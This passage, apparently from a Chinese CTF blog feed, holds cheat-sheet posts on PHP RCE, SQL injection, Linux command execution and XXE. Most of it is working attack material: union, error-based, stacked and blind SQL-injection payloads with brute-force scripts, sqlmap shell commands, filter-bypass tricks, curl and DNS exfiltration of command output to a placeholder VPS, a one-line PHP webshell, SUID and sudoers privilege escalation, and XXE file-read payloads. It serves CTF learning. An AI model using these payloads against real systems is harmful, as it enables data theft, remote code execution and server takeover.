class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下列 payload 取自 <a href="https://blog.csdn.net/m0_73512445/article/details/134542950">https://blog.csdn.net/m0_73512445/article/details/134542950</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="comment"># /usr/bin/python3</span></span><br><span class="line"><span class="comment"># @Author:Firebasky</span></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">urlbm</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fun = <span class="built_in">input</span>(<span class="string">&quot;Firebasky&gt;: &quot;</span>).strip(<span class="string">&quot;)&quot;</span>).split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> fun[:-<span class="number">1</span>]:</span><br><span class="line">        exp += urlbm(each)</span><br><span class="line">        <span class="built_in">print</span>(exp)</span><br><span class="line">    exp += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(fun) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一些常见-RCE-形式&quot;&gt;一些常见 RCE 形式&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;eval($_POST[1]);
`$_GET[1]`;
?&amp;gt;&amp;lt;?=`&amp;#123;$&amp;#123;_GET&amp;#125;[1]&amp;#125;`?&amp;gt;
&lt;/code&gt;&lt;/pr</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="RCE" scheme="https://blog.hatchet.top/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入汇总</title>
    <link href="https://blog.hatchet.top/posts/27c8c18f.html"/>
    <id>https://blog.hatchet.top/posts/27c8c18f.html</id>
    <published>2024-09-20T05:17:30.000Z</published>
    <updated>2024-11-18T05:04:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL-结构">SQL 结构</h1><p>整个结构分为数据库(database)，表(table)，列(column)和数据。<br>具体关系如图</p><ul><li>数据库(database) <code>information_schema.schemata</code> <code>table_schema</code></li><li><ul><li>表(table) <code>information_schema.schemata.tables</code> <code>table_name</code></li></ul></li><li><ul><li><ul><li>列(column) <code>information_schema.columns</code> <code>column_name</code></li></ul></li></ul></li><li><ul><li><ul><li><ul><li>数据</li></ul></li></ul></li></ul></li></ul><h1 id="SQL-查询用法">SQL 查询用法</h1><pre><code>查询语句通常为 select a from b where c查库名 select schema_name from information_schema.schemata查表名 select group_concat(table_name) from information_schema.tables where table_schema=database()查列名 select group_concat(column_name) from information_schema.columns where table_name='ctf'查数据 select group_concat(secret,user) from ctf</code></pre><h1 id="SQLMAP用法">SQLMAP用法</h1><p>下载：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>中文手册：<a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Usage/Injection.html">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Usage/Injection.html</a><br>曾经直接注时被 Cookies 卡了半天。我更推荐把 http 文件保存下来用 sqlmap。</p><pre><code>--batch 自动处理请求直接 GET 注： python sqlmap.py -u &quot;url?id=1&quot; --batch- 使用-r 参数用 burp 保存为 1.txt 放到同目录。python sqlmap.py -r 1.txt -p username --batch- 库名 python sqlmap.py -r 1.txt -p username --batch --dbs    - 当前库名 python sqlmap.py -r 1.txt -p username --batch --current-db- 表名 python sqlmap.py -r 1.txt -p username --batch -D mysql --tables- 列名数据一起 python sqlmap.py -r 1.txt -p username --batch -D mysql -T ctf --columns --dump- 选择注入方法 –-technique- 默认为所有    - 注入类型对应的参数      B：基于布尔的盲注      E：基于错误      U：基于联合查询      S：堆叠查询      T：基于时间的盲注      Q：内联查询      python sqlmap.py -r 1.txt -p username –-technique BE --batch- SQLMAP 写 shell  python sqlmap.py -r 1.txt -p username --batch --os-shell  找不到 flag 时可以试试- 自定义注入 payload    - 选项：--prefix 和 --suffixpython sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php/?id=1&quot; -p id --prefix &quot;')&quot; --suffix &quot;AND ('abc'='abc&quot;python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php/?id=1&quot; -p id --prefix &quot;\&quot;)&quot; --suffix &quot;AND ('abc'='abc&quot;注入字符有双引号必加\注释- 显示具体payload -v 3 或 -vv （等级默认为1，顺序为0~6，不加等级为2）</code></pre><h1 id="联合查询">联合查询</h1><ul><li>适合有回显的情况</li></ul><h2 id="判断注入类型">判断注入类型</h2><h3 id="数字类（如-id）">数字类（如 id）</h3><pre><code>$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</code></pre><p>直接在数字后注入，不需要空格</p><h3 id="字符类">字符类</h3><pre><code>SELECT * FROM users WHERE username='$username' AND password='$password';</code></pre><p>需要引号闭合。看题目，如果没给源码一般是单个’或&quot;闭合，如果给了源码要判断所有的闭合，记得括号也要闭合完全</p><h2 id="手动注">手动注</h2><p>sql 结尾要使用注释符号，常见的有：</p><pre><code>--+（这里的+是 url 编码过的空格）,--%20（get 传参网站自动省略最后的空格）,#,%23（经过 url 编码）。</code></pre><p>还可以构造如 or ‘1’=‘1 来闭合后面的引号，类似的还有末尾加’,where/**/'1，（做多了题感觉注释真的很看脸，注释不成功就注不下去了）</p><pre><code>1' or true# (万能密码)(在这里解决闭合和注释)1' order by 3# 一直累加数字直到报错（或界面与之前不同）：1' order by 4#  Unknown column '4' in 'order clause</code></pre><p>这时说明一共 3 位，要联合查询 3 位。</p><pre><code>a'union select 1,2,3#</code></pre><p>回显的数字说明哪里是回显位。例子中回显的是 2</p><pre><code>a'union select 1,database(),3#</code></pre><p>库名 mysql</p><pre><code>a'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</code></pre><p>表名 ctf<br>有种类似写法是把 select 写到里面：</p><pre><code>a'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#。</code></pre><p>个人不推荐，很影响美观</p><pre><code>a'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctf'#列名 secreta'union select 1,group_concat(secret),3 from ctf#</code></pre><p>得到 flag，这里 from 后面可以不需要引号<br>如果限制字符长度可能读不全，需要使用函数截取长度</p><pre><code>常见的如 substring,substr,mid,right,left（读不出来记得换，小心过滤）a'union select 1,substring(group_concat(secret),0,30),3 from ctf#a'union select 1,substring(group_concat(secret),25,30),3 from ctf#</code></pre><p>记得合并时去除重叠字符<br>一次读多个数据这样写</p><pre><code>a'union select 1,group_concat(id,'~',username,'~',password),3 from user#</code></pre><h1 id="报错注入">报错注入</h1><ul><li><p>extractvalue</p><pre><code>1'||extractvalue(1,concat('~',database()))#1'||extractvalue(1,concat('~',(select(group_concat(schema_name))from(information_schema.schemata))))#1'||extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('security'))))#1'||extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('users'))))#1'||extractvalue(1,concat('~',(select(data)from(output))))#1'||extractvalue(1,concat('~',(select(mid((data),25,30))from(output))))#</code></pre></li><li><p>updatexml</p><pre><code>1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('data1')),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(data1)),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(user)),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(substring(group_concat(link),25,30))from(user)),0x7e),1))#1'or(updatexml(1,concat(0x7e,(select(right(group_concat(link),25))from(user)),0x7e),1))#//substring,substr,mid,right,left</code></pre></li></ul><h1 id="堆叠注入">堆叠注入</h1><p>在 SQL 终端 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，语句会一起执行。</p><pre><code>1';show databases;#得表名supersqli1';use supersqli;show tables;#1';use supersqli;show columns from `words`;#1';use supersqli;show columns from `1919810931114514`;#①1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#1'or 1=1#②1';use supersqli;SET @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE sql1 from @sql;EXECUTE sql1;#③1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#1';create table less38 like users;#1';drop table less38;#insert插入数据库1';insert into ctf values(&quot;111&quot;,&quot;aaa&quot;,&quot;bbb&quot;);--%20*,11;set sql_mode=pipes_as_concat;select 1</code></pre><h1 id="布尔，时间盲注">布尔，时间盲注</h1><p>利用脚本 二分查找所有可见字符<br>bool <a href="http://xn--8nru34h.py">参考.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bool</span></span><br><span class="line">payload1 = <span class="string">&quot;1&#x27;or ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;1&#x27;or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;1&#x27;or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;1&#x27;or ascii(substr((select(group_concat(username,&#x27;~&#x27;,password))from(users)),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">28</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        url = <span class="string">&quot;http://node5.anna.nssctf.cn:21028/Less-15/&quot;</span></span><br><span class="line">        payload = payload4.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&quot;uname&quot;</span>: payload, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag.jpg&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(low)</span></span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>time <a href="http://xn--8nru34h.py">参考.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># time</span></span><br><span class="line">payload1 = <span class="string">&quot;1&#x27;or if(ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;1&#x27;or if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;1&#x27;or if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;1&#x27;or if(ascii(substr((select(group_concat(username,&#x27;~&#x27;,password))from(users)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">28</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        url = <span class="string">&quot;http://node5.anna.nssctf.cn:21028/Less-15/&quot;</span></span><br><span class="line">        payload = payload1.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        data = &#123;<span class="string">&quot;uname&quot;</span>: payload, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录开始时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        response_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response_time &gt;= <span class="number">0.8</span>:  <span class="comment"># 判断是否延时</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>waf 不强可以用 SQLMAP 省时间</li></ul><h1 id="过滤绕过">过滤绕过</h1><h2 id="大小写，双写">大小写，双写</h2><p>字面意思，有些过滤不严的只过滤全小写，sql 对大小写不敏感，构造 Select 就能绕过，双写如过滤 or 在中间再写一遍，oorr 就绕过了<br>判断通过报错中没有对应关键字逐一尝试就行（应该不会有出题人不给源码和报错又加双写吧）</p><h2 id="16-进制转换">16 进制转换</h2><p>可以把引号内的字符串转为 0x 开头的 16 进制数来绕过<br>‘flag’-&gt;0x666c6167</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;0x&#x27;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="常用替换">常用替换</h2><pre><code>空格-&gt;/\*\*/,括号绕过,%a0,%09and-&gt;&amp;&amp;or-&gt;||=-&gt;like,regexpdatabase()-&gt;schema()table_schema-&gt;database_nameinformation_schema被过滤使用无列名注入</code></pre><h2 id="注释符">注释符</h2><pre><code>--空格--+#%23^1末尾加'or '1'='1and '1'='1where/**/'1</code></pre><h2 id="大于小于号绕过">大于小于号绕过</h2><p>在 sql 盲注中，一般使用大小于号来判断 ascii 码值的大小来达到爆破的效果。<br>绕过可以使用下列函数:</p><pre><code>greatest(n1, n2, n3…):返回 n 中的最大值least(n1,n2,n3…):返回 n 中的最小值select * from cms_users where userid=1 and greatest(ascii(substr(database(),1,1)),1)=99;strcmp(str1,str2):  若所有的字符串均相同，则返回 STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1  select * from cms_users where userid=1 and strcmp(ascii(substr(database(),0,1)),99);in + 关键字  select * from cms_users where userid=1 and substr(database(),1,1) in ('c');between a and b:范围在 a-b 之间（不包含 b）  select * from cms_users where userid=1 and substr(database(),1,1) between 'a' and 'd';</code></pre><h2 id="concat-被过滤">concat 被过滤</h2><ul><li>在 select 语句结尾加 limit 1（只会读取一个数据，即第一个）<br>可以逐一读取直到读到想要的值<br>limit 0,1-&gt;第一个,limit 1,1-&gt;第二个,limit 2,1-&gt;第三个…<br><a href="https://blog.csdn.net/nicai321/article/details/123119356">https://blog.csdn.net/nicai321/article/details/123119356</a></li></ul><h2 id="无列名注入">无列名注入</h2><p>适用 information_schema 被过滤。<br>原理为将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询</p><pre><code>1'union/**/select/**/1,2,`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/'11'union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/'1</code></pre><p>当`反引号也被过滤时，使用 as 别名替换绕过</p><pre><code>1'union/**/select/**/1,2,group_concat(a)/**/from/**/(select/**/1/**/as/**/a/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/'1</code></pre><h2 id="过滤了小括号">过滤了小括号()</h2><p>运气做出来过一题，记录一下<br>concat()转为 limit,然而 limit 也被屏蔽后。。</p><pre><code>eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Schemata+Where+Schema_name+like+binary+'A%'%23eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+binary+'A%'%23eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+'ctf'+and+Table_name+like+binary+'A%'%23eid002'+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Columns+Where+Table_Schema+like+'ctf'+and+Table_name+like+'f1444444g'+and+Column_name+like+binary+'A%'%23eid002'+Union+Select+1,2,fl4g,4,5+From+f1444444g%23</code></pre><p>靠执行成功时数字溢出进行布尔盲注。</p><h1 id="SQL-杂项">SQL 杂项</h1><ul><li><p>ffifdyop md5($password,‘true’)-&gt;ffifdyop</p></li><li><p>可尝试 load_file()直接读入</p><pre><code>1'union select 1,2,3,4,load_file('/flag')</code></pre></li><li><p>SQL 登录题</p><pre><code>username=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&amp;pw=123456username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></pre></li><li><p>quine 注入<br>过滤了 char，用 chr 或者 0x 代替</p><pre><code>.1'/**/union/**/select/**/replace(replace('1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#',char(34),char(39)),char(46),'1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#')#B1'/**/union/**/select/**/replace(replace('&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#',char(34),char(39)),char(66),'&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#')#%1'/**/union/**/select/**/REPLACE(replace('&quot;/**/union/**/select/**/REPLACE(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#',0x22,0x27),0x25,'&quot;/**/union/**/select/**/REPLACE(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#')#</code></pre></li><li><ul><li>char()转为 0x 脚本</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">str_input = <span class="string">&quot;&quot;&quot;1&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;,char(34),char(39)),char(66),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;)#&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_to_hex</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;num:x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">result = re.sub(<span class="string">r&quot;char\((\d+)\)&quot;</span>, char_to_hex, str_input)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>UPDATE 注入<ol><li>注册时将用户名设为如 admin’-- ,admin’#,通过修改密码处的 UPDATE 函数修改原本密码。</li><li>修改商品价格 1’;UPDATE items SET price=1;#</li></ol></li><li>二次注入<br>对用户名联合注入<br>注意冒号前不能设置为能查询到的值，不然没法回显</li></ul>]]></content>
    
    
    <summary type="html">尽量写的详细</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>linux命令执行</title>
    <link href="https://blog.hatchet.top/posts/5eef1d19.html"/>
    <id>https://blog.hatchet.top/posts/5eef1d19.html</id>
    <published>2024-09-18T16:24:00.000Z</published>
    <updated>2024-11-21T13:58:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行">命令执行</h1><h2 id="常见命令执行命令">常见命令执行命令</h2><pre><code>systemexecpassthrushell_exec</code></pre><p>exec 和 shell_exec 无回显</p><ul><li><p>保存到文件<br>cmd=ls /|tee 1.txt<br>或 cmd=ls / &gt; 1.txt<br>访问 <a href="http://url/1.txt">http://url/1.txt</a></p></li><li><p>通过 curl 外带<br>curl <a href="http://yourvpsip.com/">http://yourvpsip.com/</a> <code>ls / | base64</code></p></li><li><p>Dns 外带<br>通过 DNS 网站 ping 通时传输数据<br>国内的网站如 <a href="http://ceye.io/">CEYE</a> 和 <a href="https://dnslog.cn/">DNSlog</a></p><pre><code>  ping `cat /flag | base64` .abcdef.ceye.io  ping `cat /flag | base64` .xxxxxxx.dnshook.site</code></pre></li><li><p>直接写马<br>通过 echo 命令写 php 木马，蚁剑连接</p><pre><code>  echo '&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;' &gt; 1.php  不用单引号的话就得在$前加\</code></pre></li></ul><h2 id="个人收集常见指令">个人收集常见指令</h2><pre><code>查看目录：ls,dir移动目录：cd删除文件：rm &lt;文件名&gt;查看文件: cat等复制文件：cp &lt;文件名&gt; &lt;文件名&gt;重命名：mv &lt;文件名&gt; &lt;文件名&gt;</code></pre><h2 id="SUID-命令提权">SUID 命令提权</h2><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 几乎涵盖了所有可以提权的命令<br>寻找所有权限带 s 的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">-user 指定文件拥有者</span><br><span class="line">-perm 文件权限</span><br><span class="line">-<span class="built_in">exec</span> 执行系统命令</span><br><span class="line">/usr/bin/sudo -l 列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure><h3 id="sudo">sudo</h3><pre><code>如果sudo可用，可用sudo -l获取所有无需密码的命令使用时在前面加sudo如 sudo find /etc/passwd -exec cat /flag \;</code></pre><h3 id="find">find</h3><pre><code>find /etc/passwd -exec whoami \;find /etc/passwd -exec cat /flag \;</code></pre><h3 id="date-读取文件">date 读取文件</h3><pre><code>date -f/--file &lt;filename&gt;</code></pre><h3 id="awk">awk</h3><pre><code>awk 'BEGIN &#123;system(&quot;whoami&quot;)&#125;'</code></pre><h3 id="sed-读取文件">sed 读取文件</h3><pre><code>sed -n '1p' /flag</code></pre><h3 id="vim">vim</h3><pre><code>vim /etc/sudoers添加你的账户sudo bash</code></pre><h3 id="file-读取文件">file 读取文件</h3><pre><code>file -f /flag</code></pre><h3 id="env">env</h3><pre><code>env /bin/sh</code></pre><h3 id="sudoedit">sudoedit</h3><pre><code>update-alternatives --config editor 查看所有可用编辑器EDITOR=&quot;nano -- /flag&quot; sudoedit /etc/GAMELAB或者EDITOR='nano -- /etc/passwd' sudoedit -- /etc/GAMELAB将你ID的数字改成0:0，初始路径改为/root，ctrl+0保存,ctrl+x退出tail -1 /etc/passwd</code></pre><h2 id="linux-管道符">linux 管道符</h2><pre><code>; 前面执行完成后再执行后面的语句| 直接执行后面的执行语句|| 只有前面执行出错时才执行后面的执行语句&amp; 无论前面真假都执行后面的语句&amp;&amp; 只有前面为真才执行后面的语句换行符也可以%0a、%0d、\n</code></pre><h2 id="绕过">绕过</h2><h3 id="关键字过滤绕过">关键字过滤绕过</h3><pre><code>flag 被过滤cat /flagcat /fla\gcat /fla&quot;&quot;gcat /fla''gcat /fl??cat /f\*cat /[e-h][k-m][9-b][e-h]cat /fl$1agcat /fl$2agcat /fl$@ag/???/?at /flaga=g;cat /fla$a</code></pre><h3 id="cat-类似命令">cat 类似命令</h3><pre><code>more、less、head、tail、sort、tac、nl</code></pre><h3 id="空格绕过">空格绕过</h3><pre><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$1、$IFS$9、$&#123;IFS&#125;、$IFS</code></pre><h3 id="payload-经过-base64-绕过">payload 经过 base64 绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2F0IC9mbGFn|<span class="built_in">base64</span> -d|sh</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure><h1 id="重要文件">重要文件</h1><pre><code>/proc/self/environ/proc/1/environ/etc/hosts/etc/passwd/var/log/nginx/access.log/var/log/apache2/access.log/proc/self/fd/3/proc/self/cmdline/flag/var/www/html/flag.php/var/www/html/flag.txt/var/www/html/flag</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;命令执行&quot;&gt;命令执行&lt;/h1&gt;
&lt;h2 id=&quot;常见命令执行命令&quot;&gt;常见命令执行命令&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;system
exec
passthru
shell_exec
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exec 和 shell_exec 无回显&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://blog.hatchet.top/posts/e93ac459.html"/>
    <id>https://blog.hatchet.top/posts/e93ac459.html</id>
    <published>2024-09-18T15:47:42.000Z</published>
    <updated>2024-10-24T10:49:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE">XXE</h1><p>XXE （PHP 5.45 之后不解析实体）</p><pre><code>&lt;!DOCTYPE 根标签名 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>DTD 实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。</p><p>约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><pre><code>&lt;!ELEMENT 标签名 ANY&gt;</code></pre><p>同时 xxe 可进行内网探测读取 /etc/hosts</p><h1 id="Payload">Payload</h1><h2 id="PHP-文件读取">PHP 文件读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="file-协议读取文件">file 协议读取文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span 